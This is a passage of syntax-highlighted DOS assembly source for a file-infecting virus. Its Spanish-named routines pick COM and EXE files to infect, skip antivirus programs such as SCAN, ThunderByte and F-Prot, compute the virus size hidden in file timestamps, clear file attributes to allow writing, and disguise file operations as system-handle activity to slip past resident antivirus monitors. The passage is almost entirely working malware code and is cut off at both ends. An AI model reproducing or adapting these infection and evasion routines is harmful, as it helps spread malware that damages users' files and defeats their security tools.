        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">08</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; SI=address of file extension on FCB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc0">
</span><span class="sc5">@@LoopFCB_02</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">LODSB</span><span class="sc0">           </span><span class="sc1">; Check if space</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@FinLoopFCB_2</span><span class="sc0">    </span><span class="sc1">; If space, end loop</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">  </span><span class="sc5">@@LoopFCB_02</span><span class="sc0">
</span><span class="sc5">@@FinLoopFCB_2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">      </span><span class="sc1">; Store a NUL character</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">      </span><span class="sc1">; Return name in DS:DX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">ObtenNombreFCB</span><span class="sc0">  </span><span class="sc9">ENDP</span><span class="sc0">        </span><span class="sc1">; End of procedure</span><span class="sc0">

</span><span class="sc1">;; Procedure to get the virus size in the file of the SFT in ES:DI</span><span class="sc0">
</span><span class="sc5">TamanyoReal</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">0Dh</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get time</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1FE0h</span><span class="sc0">    </span><span class="sc1">; Get hour and minutes in AX</span><span class="sc0">
        </span><span class="sc6">ROR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LongVirus2</span><span class="sc0">   </span><span class="sc1">; Add static size</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">          </span><span class="sc1">; return</span><span class="sc0">
</span><span class="sc5">TamanyoReal</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; FAKEHANDLE! It selects randomly a handle between 0000 and 0003 and substitu-</span><span class="sc0">
</span><span class="sc1">;; tes the handle in BX with the random handle. Handles from 0 to 4 are system</span><span class="sc0">
</span><span class="sc1">;; handles, and most resident anti-virus ignore operations on this handles, so</span><span class="sc0">
</span><span class="sc1">;; the virus can read/write appearing to be system operations.</span><span class="sc0">
</span><span class="sc1">;; VLAD: Thanks for this idea ;)</span><span class="sc0">
</span><span class="sc5">FakeHandle</span><span class="sc0">  </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">AntHandle</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0"> </span><span class="sc1">; Save original handle</span><span class="sc0">
        </span><span class="sc6">IN</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">         </span><span class="sc1">; Get a random handle in BX</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">         </span><span class="sc1">; between 0 and 3</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">35h</span><span class="sc0">         </span><span class="sc1">; Duplicate system handle</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">FakedHandle</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0"> </span><span class="sc1">; Save duplicated handle</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Eh</span><span class="sc0">         </span><span class="sc1">; Close system handle</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">AntHandle</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Duplicate file handle. Now</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">35h</span><span class="sc0">         </span><span class="sc1">; the function returns the</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">          </span><span class="sc1">; closed system handle</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">; Save handle</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">AntHandle</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Close file handle</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Eh</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">          </span><span class="sc1">; Put in BX the new file handle</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">FakeHandle</span><span class="sc0">  </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; UNFAKEHANDLE! It restores all bad made with FAKEHANDLE :)</span><span class="sc0">
</span><span class="sc5">UnfakeHandle</span><span class="sc0">    </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Eh</span><span class="sc0">   </span><span class="sc1">; Close actual handle on BX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">35h</span><span class="sc0">   </span><span class="sc1">; Duplicate the duplicated system handle. The</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">FakedHandle</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; function will return the</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">      </span><span class="sc1">; faked system handle. We leave it opened.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Eh</span><span class="sc0">   </span><span class="sc1">; Close the duplicated file handle. Now every</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">    </span><span class="sc1">; handle is like before</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">       </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">UnfakeHandle</span><span class="sc0">    </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Executable type (0=COM, 1=EXE)</span><span class="sc0">
</span><span class="sc5">TipoEjec</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; Memory write zone</span><span class="sc0">
</span><span class="sc5">Basura15</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;; Routine to read the file header</span><span class="sc0">
</span><span class="sc5">LeeCabecera</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PtrInicio</span><span class="sc0">   </span><span class="sc1">; Put pointer to the beginning</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">     </span><span class="sc1">; Read 24 bytes of header</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0018h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Cabecera</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">LeeCabecera</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Routine to put handle pointer in the beginning of the file</span><span class="sc0">
</span><span class="sc5">PtrInicio</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; AX=DX=0</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0"> </span><span class="sc1">; Put new pointer</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">PtrInicio</span><span class="sc0">   </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Procedure to put handle pointer in the end of the file</span><span class="sc0">
</span><span class="sc5">PtrFinal</span><span class="sc0">    </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get file size in DX-AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Put this value like file pointer</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">PtrFinal</span><span class="sc0">    </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Procedure to put handle pointer in the end minus 1A bytes</span><span class="sc0">
</span><span class="sc5">PtrCasiFinal</span><span class="sc0">    </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get file size</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc0">    </span><span class="sc1">; Subtract 1A bytes from file size</span><span class="sc0">
        </span><span class="sc6">SBB</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0"> </span><span class="sc1">; Put this value like pointer</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">PtrCasiFinal</span><span class="sc0">    </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Routine to get information about the name of the file from its SFT. The rou-</span><span class="sc0">
</span><span class="sc1">;; tine will return Carry Flag if it hasn't a convenient name.</span><span class="sc0">
</span><span class="sc5">OperaHandle</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">      </span><span class="sc1">; Get in DS:DI the System File Table</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1220h</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">    </span><span class="sc5">@@Retorna</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Retorna</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1216h</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">    </span><span class="sc5">@@Retorna</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get extension on AL-AH-CL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">2Ah</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B3h</span><span class="sc0">     </span><span class="sc1">; If CL was "M", now CL=0</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B0BDh</span><span class="sc0">   </span><span class="sc1">; If AX was "CO", now AX=0</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@COMdeMomento</span><span class="sc0"> </span><span class="sc1">; If 0, jump</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0902h</span><span class="sc0">    </span><span class="sc1">; Was it "EX"?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Retorna</span><span class="sc0">      </span><span class="sc1">; If it isn't, return with Carry Flag</span><span class="sc0">
</span><span class="sc5">@@EXEdeMomento</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc0">     </span><span class="sc1">; Was the third letter an "E"?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Sigue001</span><span class="sc0">     </span><span class="sc1">; If it was, jump and continue</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Retorna</span><span class="sc0">      </span><span class="sc1">; Return (error)</span><span class="sc0">
</span><span class="sc5">@@COMdeMomento</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">       </span><span class="sc1">; Was the third letteer an "M"? (when the</span><span class="sc0">
                     </span><span class="sc1">; first two bytes where a "CO")</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Retorna</span><span class="sc0">      </span><span class="sc1">; If not, exit with Carry Flag</span><span class="sc0">
</span><span class="sc5">@@Sigue001</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get two first letters of file name in AX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'CS'</span><span class="sc0">     </span><span class="sc1">; AX="SC"? (SCAN)</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Retorna</span><span class="sc0">      </span><span class="sc1">; If it is, return</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'BT'</span><span class="sc0">     </span><span class="sc1">; AX="TB"? (ThunderByte)</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Retorna</span><span class="sc0">      </span><span class="sc1">; If it is, return</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'-F'</span><span class="sc0">     </span><span class="sc1">; AX="F-"? (F-Prot)</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Retorna</span><span class="sc0">      </span><span class="sc1">; If it is, return</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0008</span><span class="sc0">     </span><span class="sc1">; Search a digit or a "V" in the name. If</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0020h</span><span class="sc0">    </span><span class="sc1">; it exists, return with Carry Flag</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'V'</span><span class="sc0">
     </span><span class="sc5">@@LLCD</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@LLCD2</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'9'</span><span class="sc0">
        </span><span class="sc6">JBE</span><span class="sc0">   </span><span class="sc5">@@Retorna</span><span class="sc0">
     </span><span class="sc5">@@LLCD2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">SCASB</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Retorna</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">  </span><span class="sc5">@@LLCD</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0008h</span><span class="sc0">    </span><span class="sc1">; Is it the "COMMAND.COM"?</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'OC'</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Retorna2</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'MM'</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Retorna</span><span class="sc0">      </span><span class="sc1">; If it is, return with Carry Flag</span><span class="sc0">
   </span><span class="sc5">@@Retorna2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0020h</span><span class="sc0">
        </span><span class="sc6">CLC</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Salto00</span><span class="sc0">      </span><span class="sc1">; End.</span><span class="sc0">
    </span><span class="sc5">@@Retorna</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">STC</span><span class="sc0">
    </span><span class="sc5">@@Salto00</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">OperaHandle</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Procedure to change attributes and access mode on handle</span><span class="sc0">
</span><span class="sc5">CambiaAtributos</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get first word on SFT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Anterior_Count</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0"> </span><span class="sc1">; Save it</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">  </span><span class="sc1">; SFT is now busy</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">04</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Get file attributes and sa-</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Atributos</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">      </span><span class="sc1">; ve them</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">04</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; Clear attributes</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Change access mode to</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ModoAcceso</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0"> </span><span class="sc1">; read/write</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0002h</span><span class="sc0">
